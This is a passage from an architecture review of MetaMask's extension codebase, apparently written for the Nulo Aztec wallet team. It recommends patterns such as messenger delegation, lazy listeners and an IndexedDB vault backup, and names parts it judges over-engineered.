1. **The Messenger pattern with strict TypeScript delegation.** `@metamask/messenger`'s `delegate({ messenger, actions, events })` is the single best discipline I saw. Force every cross-service action and event to be explicitly delegated so a typo or unintended dependency fails compilation. Your existing `Service<Methods, Events>` is in the same family — codify the rules.

2. **The `LazyListener` pattern for SW boot.** `app/scripts/lib/extension-lazy-listener/extension-lazy-listener.ts` — register listeners synchronously at module top, buffer events, replay when real handlers attach. This is **the** robust pattern for surviving MV3 cold starts and `runtime.onInstalled` races. Adopt verbatim.

3. **The deferred-promise gating pattern.** `let isInitialized` (`background.js:263`) + `await isInitialized` before processing port traffic. Every `onConnect` queues until full boot. Combine with #2.

4. **The `connectionStream + JSON-RPC + ObjectMultiplex` pattern.** Three substreams over one Chrome port (controller / patches / provider) is more efficient than three separate ports. `@metamask/object-multiplex` and `@metamask/post-message-stream` are MIT-licensed and battle-tested. For Nulo's popup ↔ SW communication, this is a direct upgrade path from your current `Service` model when you outgrow simple per-method RPC.

5. **The `PatchStore` Immer-patches over wire pattern.** Send Immer patches, not full state, on UI updates. Scales linearly with change rate, not with state size. `app/scripts/lib/PatchStore.ts` is 156 lines and self-contained.

6. **Migrations from day zero.** Numeric-versioned, sequential, in-place mutating, failure-tolerant. Write the framework now even if you have 5 migrations. The framework is 200 lines (`app/scripts/lib/migrator/index.js`).

7. **The `IndexedDB backup` pattern for vault recovery.** A second storage location that holds **only** `KeyringController + AppMetadataController + MetaMetricsController`. If primary storage corrupts (and it does, see Firefox's `chrome.storage.local` flakiness on disk pressure), the user doesn't lose the wallet. For Aztec where state corruption could mean unrecoverable funds, this is mandatory.

8. **The `controller-init` factory pattern.** Each controller has a co-located init function that takes `{ messenger, persistedState, ... }` and returns the constructed controller. Makes controllers trivially unit-testable in isolation. The init layer also serves as the typed dependency declaration.

9. **The approval/permission state machine.** Three actions: `addRequest` returns a Promise, `acceptRequest` resolves it, `rejectRequest` rejects it. UI subscribes to `pendingApprovals`. This is the **best** way to model "user needs to confirm" flows. Nulo's interaction service should adopt this pattern verbatim.

10. **State metadata with `persist` and `anonymous` flags.** `StateMetadata<T>` from `@metamask/base-controller`. Marks each state slice as persisted-or-not and Sentry-anonymous-or-not. Use it for both storage and crash reporting.

---

## 13. What's over-engineered or organizational debt

Things that exist because MetaMask is MetaMask — not because they're inherently good:

1. **80+ controllers.** Many controllers are 200-line wrappers around `@metamask/*-controller` packages that just delegate. The `messenger-client-init/` directory has 80 init files of which maybe 40 are non-trivial. For Nulo, every controller you add is an event surface, a state slice, an init function, a messenger factory, and a test file. **One service per concern, max**. A single `WalletService` is fine; you don't need an `AnnouncementController`, `OnboardingController`, `AppMetadataController`, `AlertController`, and `LoggingController` to be separate things.

2. **Browserify + Webpack dual build.** Path-dependent technical debt. They're slowly moving to webpack-only.

3. **MV2 + MV3 dual manifest.** Same. Once webRequestBlocking sunsets they'll drop V2.

4. **Four build flavors with separate policies.** `flask`, `experimental`, `beta`, `main` — the latter three are organizational ceremony. The actual code variation between them is ~30 env vars. Nulo can use a single build with env-flag-gated features.

5. **LavaMoat at this scale.** Genuinely useful but staffed by a team. The 40k-line policy.json files don't review themselves — every dependency bump is a PR with policy diff that requires careful inspection. Worth it at MetaMask scale, not at Nulo's pre-launch scale.

6. **Snaps.** Massive surface area. Don't.

7. **`metamask-controller.js` length.** 10k lines is wiring + 200 method-stubs that bind to `messengerClientApi`. It's slowly being dismantled by the `messenger-client-init/` migration but the backwards-compat property assignments at lines 754-866 will live forever.

8. **The `legacy-background-api-service`** (it's literally listed in `messengerClientInitFunctions`) — a service whose explicit purpose is "we're routing the old API surface through here for backwards compat". The fact that this exists means the boundary between old-style direct method calls and new-style messenger calls is still being drawn. For Nulo: pick one model and never deviate.

9. **The 206 migrations file count** isn't over-engineered (each is genuinely needed for some bug fix), but it's a sign that controller state shape is undercommitted at design time. Many migrations exist because someone added a property without thinking about a default. Spend more time on initial state design for Nulo.

10. **Snow + LavaMoat realm scuttling** (`app/scripts/use-snow.js`). 30 lines that integrate two security tools to defend against attackers creating fresh JS realms via iframes. Real attack vector? Yes. Worth defending against in 2026 for a non-MetaMask wallet? No. Two layers of speculative paranoia.

11. **`extensionPort.postMessage({ name: 'app-init-liveness' })`** as the heartbeat protocol. This works but is bespoke. The reason it exists is to disambiguate "SW is dead" from "SW is busy initializing". It's correct but the protocol is hand-rolled. For Nulo, the "queue port traffic behind `await isInitialized`" pattern is cleaner.

12. **The presence of `sentry-make-transport.ts`, `sentry-get-state.ts`, `disable-console.js`, two separate critical-error directories, and `setup-initial-state-hooks.js`** is a sign that error-reporting infrastructure has accumulated organically over years. Some of this is required when shipping to 30M users; most of it is over-instrumentation.

---

## TL;DR

MetaMask is a 7-year-old codebase under continuous active development that has solved most of the hard problems an MV3 extension wallet faces — but at a complexity cost only a 30-person team can afford. The architectural lessons are gold: **messenger pattern with strict delegation, lazy listener buffering, deferred-promise port gating, multiplexed substreams, Immer-patches over the wire, IndexedDB backup for the vault, sequential migrations**. Steal those.

The implementation density (10k-line god files, 80 controllers, 40k lines of LavaMoat policy, dual build systems, four build flavors, Snaps SES sandbox, 206 migrations) is what happens when you optimize for organizational scaling and supply-chain paranoia at user-tens-of-millions scale. For an Aztec wallet pre-launch, **everything past the architectural patterns is over-fitting to a problem you don't have yet**.

The single highest-ROI thing Nulo can adopt today: codify the cross-service Action/Event delegation discipline as compile-time-enforced. That alone separates a wallet that survives 5 years of feature growth from one that becomes an unmaintainable mess.
